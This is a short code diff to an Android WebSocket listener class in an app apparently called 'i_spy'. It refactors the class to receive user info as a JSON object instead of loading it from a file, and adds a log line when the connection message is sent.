@@ -12,7 +12,6 @@ import android.widget.Toast;
 
 import com.um.asn.i_spy.ListSlavesActivity;
 import com.um.asn.i_spy.R;
-import com.um.asn.i_spy.models.User;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -25,12 +24,12 @@ public class MasterWS extends WebSocketListener {
 
     private static final int NORMAL_CLOSURE_STATUS = 1000;
     private Context context;
-    private ListSlavesActivity activity;
+    private JSONObject userInfo;
 
-    public MasterWS(Context context, ListSlavesActivity activity) {
+    public MasterWS(Context context, JSONObject userInfo) {
         super();
         this.context = context;
-        this.activity = activity;
+        this.userInfo = userInfo;
     }
 
     @Override
@@ -40,11 +39,9 @@ public class MasterWS extends WebSocketListener {
             msg.put("cmd", "CONNEXION");
             msg.put("type", "master");
 
-            User user = new User();
-            user.loadWithFile(this.context);
+            msg.put("prop", this.userInfo.toString());
 
-            msg.put("prop", user.getJSON().toString());
-
+            System.out.println("Connexion websocket : master");
             webSocket.send(msg.toString());
         } catch (JSONException e) {
             e.printStackTrace();
